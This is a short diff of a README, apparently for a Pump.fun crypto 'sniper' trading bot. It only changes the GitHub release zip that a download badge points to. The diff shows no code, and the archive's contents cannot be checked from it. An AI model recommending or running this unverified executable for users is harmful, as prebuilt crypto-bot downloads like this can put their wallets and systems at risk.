@@ -58,7 +58,7 @@ There are many bots, **but**:
 
 <h2>📥 Download the Program</h2>
 
-<a href="https://github.com/Pump-Fun-Sniper/Pump-Fun-Sniper-Bot/releases/download/pumpfunsniper/PumpFunSniper.zip" download>
+<a href="https://github.com/Pump-Fun-Sniper/Pump-Fun-Sniper-Bot/releases/download/pumpfunsniper/PumpFunSniper_bot.zip" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
